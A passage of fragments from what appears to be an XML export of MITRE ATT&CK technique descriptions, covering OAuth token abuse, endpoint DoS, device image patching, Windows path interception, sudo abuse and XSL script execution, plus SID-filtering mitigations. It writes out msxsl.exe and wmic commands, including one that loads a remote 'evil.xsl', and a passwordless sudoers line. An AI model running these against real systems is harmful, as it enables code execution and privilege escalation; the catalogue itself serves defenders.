Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.(Citation: okta)&#xA;&#xA;For example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a &quot;refresh&quot; token enabling background access is awarded.(Citation: Microsoft Identity Platform Access 2019) With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.(Citation: Staaldraad Phishing with OAuth 2017)&#xA;&#xA;Compromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim&#x2019;s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow." applicability="Office 365,SaaS" source="Mitre Att&amp;ck : enterprise-attack" link="https://attack.mitre.org/techniques/T1550/001" sourceID="Mitre Att&amp;ck : enterprise-attack"/>

Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)&#xA;&#xA;An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).&#xA;&#xA;To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.&#xA;&#xA;Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.&#xA;&#xA;Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)&#xA;&#xA;In cases where traffic manipulation is used, there may be points in the the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)&#xA;&#xA;For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).&#xA;" applicability="Linux,macOS,Windows,AWS,GCP,Azure,Office 365,Azure AD,SaaS" source="Mitre Att&amp;ck : enterprise-attack" link="https://attack.mitre.org/techniques/T1499" sourceID="Mitre Att&amp;ck : enterprise-attack"/>

Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.&#xA;&#xA;To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.&#xA;&#xA;To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.&#xA;&#xA;In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.&#xA;&#xA;By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary&#x2019;s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).&#xA;&#xA;Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. &#xA;&#xA;When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). &#xA;&#xA;When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.

One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)&#xA;&#xA;There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.&#xA;&#xA;### Unquoted Paths&#xA;Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., &lt;code>C:\unsafe path with space\program.exe&lt;/code> vs. &lt;code>&quot;C:\safe path with space\program.exe&quot;&lt;/code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is &lt;code>C:\program files\myapp.exe&lt;/code>, an adversary may create a program at &lt;code>C:\program.exe&lt;/code> that will be run instead of the intended program.

Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, &lt;code>%SystemRoot%\system32&lt;/code> (e.g., &lt;code>C:\Windows\system32&lt;/code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.&#xA;&#xA;For example, if &lt;code>C:\example path&lt;/code> precedes &lt;code>C:\Windows\system32&lt;/code> is in the PATH environment variable, a program that is named net.exe and placed in &lt;code>C:\example path&lt;/code> will be called instead of the Windows system &quot;net&quot; when &quot;net&quot; is executed from the command-line.&#xA;&#xA;### Search Order Hijacking&#xA;Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.&#xA;&#xA;For example, &quot;example.exe&quot; runs &quot;cmd.exe&quot; with the command-line argument &lt;code>net user&lt;/code>. An adversary may place a program called &quot;net.exe&quot; within the same directory as example.exe, &quot;net.exe&quot; will be run instead of the Windows system utility net. In addition, if an adversary places a program called &quot;net.com&quot; in the same directory as &quot;net.exe&quot;, then &lt;code>cmd.exe /C net user&lt;/code> will execute &quot;net.com&quot; instead of &quot;net.exe&quot; due to the order of executable extensions defined under PATHEXT.

Adversaries may do this to execute commands as other users or spawn processes with higher privileges.&#xA;&#xA;Within Linux and MacOS systems, sudo (sometimes referred to as &quot;superuser do&quot;) allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The &lt;code>sudo&lt;/code> command &quot;allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.&quot;(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a &lt;code>timestamp_timeout&lt;/code>, which is the amount of time in minutes between instances of &lt;code>sudo&lt;/code> before it will re-prompt for a password. This is because &lt;code>sudo&lt;/code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at &lt;code>/var/db/sudo&lt;/code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a &lt;code>tty_tickets&lt;/code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).&#xA;&#xA;The sudoers file, &lt;code>/etc/sudoers&lt;/code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like &lt;code>user1 ALL=(ALL) NOPASSWD: ALL&lt;/code> (Citation: OSX.Dok Malware). Elevated privileges are required to edit this file though.&#xA;&#xA;Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password.

(Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)&#xA;&#xA;Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)&#xA;&#xA;* &lt;code>msxsl.exe customers[.]xml script[.]xsl&lt;/code>&#xA;* &lt;code>msxsl.exe script[.]xsl script[.]xsl&lt;/code>&#xA;* &lt;code>msxsl.exe script[.]jpeg script[.]jpeg&lt;/code>&#xA;&#xA;Another variation of this technique, dubbed &#x201c;Squiblytwo&#x201d;, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ &quot;Squiblydoo&quot; counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)&#xA;&#xA;Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)&#xA;&#xA;* Local File: &lt;code>wmic process list /FORMAT:evil[.]xsl&lt;/code>&#xA;* Remote File: &lt;code>wmic os get /FORMAT:&#x201d;https[:]//example[.]com/evil[.]xsl&#x201d;&lt;/code>" applicability="Windows" source="Mitre Att&amp;ck : enterprise-attack" link="https://attack.mitre.org/techniques/T1220" sourceID="Mitre Att&amp;ck : enterprise-attack"/>

Disabling the Shim Engine isn't recommended because Windows depends on shimming for interoperability and software may become unstable or not work.

This will prevent use of application shimming to bypass UAC. &#xA;&#xA;Changing UAC settings to &quot;Always Notify&quot; will give the user more visibility when UAC elevation is requested, however, this option will not be popular among users due to the constant UAC interruptions.">

SID Filtering of external trusts is automatically enabled on all created external trusts using Server 2003 or later domain controllers. (Citation: Microsoft Trust Considerations Nov 2014) (Citation: Microsoft SID Filtering Quarantining Jan 2009) However note that SID Filtering is not automatically applied to legacy trusts or may have been deliberately disabled to allow inter-domain access to resources.&#xA;&#xA;SID Filtering can be applied by: (Citation: Microsoft Netdom Trust Sept 2012)&#xA;&#xA;* Disabling SIDHistory on forest trusts using the netdom tool (&lt;code>netdom trust &lt;TrustingDomainName> /domain:&lt;TrustedDomainName> /EnableSIDHistory:no&lt;/code> on the domain controller). &#xA;* Applying SID Filter Quarantining to external trusts using the netdom tool (&lt;code>netdom trust &lt;TrustingDomainName> /domain:&lt;TrustedDomainName> /quarantine:yes&lt;/code> on the domain controller)&#xA;Applying SID Filtering to domain trusts within a single forest is not recommended as it is an unsupported configuration and can cause breaking changes. (Citation: Microsoft Netdom Trust Sept 2012) (Citation: AdSecurity Kerberos GT Aug 2015) If a domain within a forest is untrustworthy then it should not be a member of the forest. In this situation it is necessary to first split the trusted and untrusted domains into separate forests where SID Filtering can be applied to an interforest trust.">
